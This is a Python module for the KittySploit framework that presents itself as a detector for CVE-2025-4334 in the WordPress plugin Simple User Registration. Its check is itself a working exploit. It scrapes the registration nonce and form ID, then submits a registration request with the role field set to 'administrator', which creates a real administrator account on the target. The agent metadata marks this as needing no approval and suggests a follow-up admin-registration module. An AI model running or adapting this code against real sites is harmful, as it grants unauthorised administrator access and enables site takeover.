#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Simple User Registration <= 6.3 administrator registration (CVE-2025-4334)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "simple-user-registration"
_VULN_HIGH = (6, 3, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Simple User Registration CVE-2025-4334 detect",
        "description": (
            "Detects CVE-2025-4334: Simple User Registration <= 6.3 accepts wpr[wp_field][role]=administrator "
            "during wpr_submit_form admin-ajax registration."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-4334",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-4334",
            "https://github.com/Nxploited/CVE-2025-4334",
        ],
        "modules": ["auxiliary/admin/http/simple_user_registration_cve_2025_4334_admin_register"],
        "tags": ["web", "scanner", "wordpress", "simple-user-registration", "cve-2025-4334"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/simple_user_registration_cve_2025_4334_admin_register",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    register_path = OptString("/register/", "Registration page", required=False)

    _NONCE = re.compile(r'name="wpr_nonce" value="([a-f0-9]+)"', re.I)
    _FORM = re.compile(r'name="wpr_form_id" value="([0-9]+)"', re.I)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self._base()) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        reg = self._join((self.register_path or "/register/").strip())
        page = self.http_request(method="GET", path=reg, allow_redirects=True)
        if not page or page.status_code != 200:
            return False
        body = page.text or ""
        if "WPR Register" not in body and "wpr_nonce" not in body:
            return False
        nonce_m = self._NONCE.search(body)
        form_m = self._FORM.search(body)
        if not nonce_m or not form_m:
            self.set_info(
                severity="high",
                reason="Simple User Registration form exposed (version may be <= 6.3)",
                path=reg,
                cve="CVE-2025-4334",
            )
            return True
        user = f"ks{secrets.token_hex(3)}"
        email = f"{user}@example.test"
        pwd = secrets.token_urlsafe(10)
        post = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
            },
            data={
                "action": "wpr_submit_form",
                "wpr_form_id": form_m.group(1),
                "wpr_nonce": nonce_m.group(1),
                "_wp_http_referer": reg,
                "wpr[wp_field][user_login]": user,
                "wpr[wp_field][first_name]": "ks",
                "wpr[wp_field][last_name]": "test",
                "wpr[wp_field][user_email]": email,
                "wpr[wp_field][password]": pwd,
                "wpr[wp_field][confirm_password]": pwd,
                "wpr[wp_field][role]": "administrator",
            },
            allow_redirects=False,
        )
        if not post or post.status_code != 200:
            return False
        text = post.text or ""
        if "user_id" in text and "Registration Done" in text:
            self.set_info(
                severity="critical",
                reason="CVE-2025-4334 — administrator registration via wpr_submit_form",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2025-4334",
            )
            return True
        return False
